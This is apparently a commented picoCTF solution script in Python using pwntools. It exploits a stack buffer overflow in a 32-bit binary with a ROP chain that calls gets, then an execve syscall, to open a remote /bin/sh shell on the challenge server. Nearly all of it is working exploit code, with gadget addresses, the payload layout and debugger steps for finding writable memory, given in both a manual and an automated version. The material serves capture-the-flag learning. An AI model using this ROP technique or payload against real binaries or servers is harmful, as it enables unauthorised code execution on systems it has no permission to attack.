# SYSCALL execve 32bit, for 64 bit the registers are slightly different but ideas are same
from pwn import *

context.binary = elf = ELF('rop', checksec=True)
context.kernel = 'amd64'

rop = ROP(elf)
io = remote('saturn.picoctf.net', 62340)

# blukat to search binary for ret2libc but in this case libc is not linked so cannot use ret2libc

offset_to_fill = 0x18+4  # address of the variable to overflow + 4 instruction pointer

'''
Prepare a SYSCALL on the "execve" command
SYSCALL is a signal to tell the computer to run whatever stored in EAX of register, which in this case, is the address of the command "execve"
SYSCALL -> execve (stored in eax) with arguments stored in ebx, ecx, edx

To find syscall, search for the instruction 'int 0x80'
To find addresses below, generally use ROP(elf) then rop.register. If does not work, use manual way: ROPgadget --binary <bin> | grep -E "pop <register to overwrite> ; ret". Find one preferably without any other instructions on the line.

To run execve, we need to overwrite the following registers to prepare its arguments: (see https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)
eax: 0x0b  # from docs
ebx: address of the variable that contains the string to execute, in this case, '/bin/sh', we will be inputting this ourselves, which means we need to run a GETS that will overwrite a certain address holding empty data (0x0), then we overwrite ebx with that variable's address
ecx: 0x0  # from docs, this argument can be 0
edx: 0x0  # from docs, this argument can be 0
'''
SYSCALL = 0x0804a3d2  # address of the SYSCALL command, found using ROPgadget --binary rop | grep -E 'int 0x80', no need ret behind as by the time it runs SYSCALL, we should have gotten the shell. Better to choose one that doesn't have any other instructions on the line, if cannot find, then see if using a one that does NOT modify the registers that we will modify (in this case, eax, ebx, ecx, edx) works
SYSCALL = (rop.find_gadget(['int 0x80']))[0]  # can also be found automatically
EXECVE = 0x0b  # from ChromeOS docs
GETS = 0x8051b70  # address of the GETS function in the binary (from IDA)
GETS = elf.symbols['gets']  # can also be found automatically
POP_EAX = 0x080b074a  # address where we can override eax, found using ROPgadget --binary rop | grep -E "pop eax ; ret", -> pop eax ; ret
POP_EAX = rop.eax.address  # can also be found automatically
POP_EDX_EBX = 0x080583c9  # address where we can override ebx and edx, found using ROPgadget --binary rop | grep -E "pop edx ; ", -> pop edx ; pop ebx ; ret. By right, we can search for pop ebx only, but because if we search for "pop edx ; ret;" will give no result, we have to use this address for both ebx and edx.
POP_EBX = rop.ebx.address  # can also be found automatically
POP_EDX_EBX = rop.edx.address  # can also be found automatically but in this case there is no line with "pop edx ; ret" ONLY so it has to resort to a line with both ebx and edx which means later on have to adjust the payload
POP_ECX = 0x08049e39  # address where we can override ecx, found using ROPgadget --binary rop | grep -E "pop ecx ; ret", -> pop ecx ; ret
POP_ECX = rop.ecx.address  # can also be found automatically

'''
Now we need to find a place to write the string to execute. We only can write it to an address that we can write and currently holds 0x0.
gdb -d rop  # open gdb and attach to rop
break _start  # set a breakpoint so we can enter debugging session
run  # run the program
vmmap  # display the memory mappings for the program
Find the range of address that we have rw- permissions, take note of the start and end
grep "0x0000000000000000" little <start>-<end>  # searches for address in the range that holds 0x0 (null), can just use the last one found since its displayed in console
Verify by using "x <address found>" and see if it prints 0x0000000000000000
'''

address_to_write_command_str = 0x80e6ff8  # address that holds the string to execute

# Full manual way
# call_gets = p32(GETS)  # before here we have overflown the stack to reach the return pointer, so here we 'return' to the function GETS
# call_gets += p32(POP_EAX)  # to prevent GETS from returning to the previous function, we need to pop something here (originally its RET). It can be pop eax or other registers. To remove address_to_write_command_str from the stack and put it into eax
# call_gets += p32(address_to_write_command_str)  # pass in the argument to the function GETS, arguments come after the return address
#
# payload = b'A' * offset_to_fill  # fill up the buffer first
# payload += call_gets  # call GETS with the address of the string to execute so we can input and store the command to run which in this case is '/bin/sh'
# payload += p32(POP_EAX) + p32(EXECVE)  # overwrite eax with EXECVE (0x0b) by popping current eax and writing a new value there, same for all other pop commands
# payload += p32(POP_EDX_EBX) + p32(0) + p32(address_to_write_command_str)  # overwrite ebx and edx with 0 and address of the string to execute respectively. Note that if we have a single line that pops multiple registers, we need to send in the payload in the sequence that they were popped. E.g. pop edx; pop ebx; ret -> send value for edx then ebx
# # payload += p32(POP_EBX) + p32(address_to_write_command_str) + p32(POP_EDX) + p32(0)  # using automatically found addresses for ebx and edx BUT cannot work in this case because POP_EDX will pop both ebx and edx
# payload += p32(POP_ECX) + p32(0)  # overwrite ecx with 0
# payload += p32(SYSCALL)  # call SYSCALL at the end to trigger our prepared EXECVE command
#
# io.sendline(payload)  # this will trigger an input asking for the command to execute (from our GETS call)
# io.sendline(b'/bin/sh')  # input the command to execute
# io.interactive()


# Pwntools automatic way

rop = ROP(elf)
rop.gets(address_to_write_command_str)
rop.execve(address_to_write_command_str, 0, 0)

io.sendline(b"A" * offset_to_fill + rop.chain())
io.sendline(b'/bin/sh')
io.interactive()
